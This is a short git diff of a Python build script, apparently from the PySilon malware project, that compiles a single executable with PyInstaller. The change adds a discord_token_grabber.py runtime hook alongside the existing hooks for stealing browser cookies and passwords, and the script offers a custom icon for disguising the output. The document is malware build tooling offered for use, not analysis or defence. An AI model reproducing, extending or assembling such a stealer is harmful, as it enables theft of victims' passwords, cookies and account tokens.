@@ -63,7 +63,7 @@ else:
 if input('Would you like to set a custom icon to compiled executable? Y/n ').lower() == 'y':
     icon_path = get_file_path()
 
-pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
+pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --add-data "resources/libopus-0.x64.dll;." --runtime-hook=resources/misc.py --runtime-hook=resources/discord_token_grabber.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 # Uncomment if you want to use pre-downloaded PyInstaller #pyinstaller_command = 'start cmd /k "title Building file...' + ' '*240 + '& pyinstaller -F --runtime-hook=resources/misc.py --runtime-hook=resources/get_cookies.py --runtime-hook=resources/passwords_grabber.py ' + (('--icon "' + icon_path + '" ') if icon_path != '' else '') + '"main_prepared.py" & echo - & echo.Done & echo.- & pause & exit"'
 
 with open('PySilon.key', 'wb') as save_key: save_key.write(os.urandom(1024*1024))
